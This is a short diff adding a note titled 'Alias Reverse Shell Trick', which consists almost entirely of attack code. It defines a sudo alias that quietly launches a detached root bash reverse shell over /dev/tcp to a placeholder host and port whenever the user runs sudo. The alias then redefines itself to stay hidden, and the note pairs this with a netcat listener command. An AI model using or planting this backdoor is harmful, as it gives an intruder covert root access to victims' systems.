@@ -1,0 +1,7 @@
+Alias Reverse Shell Trick
+
+The shell:
+alias sudo="sudo screen -md bash -c 'bash -i >/dev/tcp/host/port 2>&1 0<&1'; alias sudo='sudo '; sudo"
+
+The listener:
+sudo nc -l -p port -vvv
